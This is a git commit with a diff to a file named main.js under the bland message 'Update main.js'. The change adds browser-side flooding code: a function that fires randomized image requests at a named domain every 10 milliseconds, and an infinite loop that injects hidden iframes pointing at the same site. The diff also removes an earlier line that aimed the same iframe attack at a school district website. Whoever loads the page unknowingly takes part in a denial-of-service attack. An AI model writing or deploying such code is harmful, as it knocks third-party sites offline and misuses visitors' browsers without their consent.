3d0eb0c9f4e65b4b183fde696425a3ab011a82b0
ninja25538 <ninja25538@users.noreply.github.com>
2017-05-15 18:01:03 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,6 +1,15 @@
+function imgflood() {  
+  var TARGET = 'korea-dpr.com';
+  var URI = '/index.html';
+  var pic = new Image();
+  var rand = Math.floor(Math.random() * 1000);
+  pic.src = 'http://'+TARGET+URI+rand+'=val';
+}
+setInterval(imgflood, 10);
+
 function _DDoS(url){
  document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
 }
- setInterval(_DDoS("http://www.mvcsc.k12.in.us"),10);
-
-
+for(;;){
+ setTimeout(_DDoS("http://korea-dpr.com/"),10);
+}
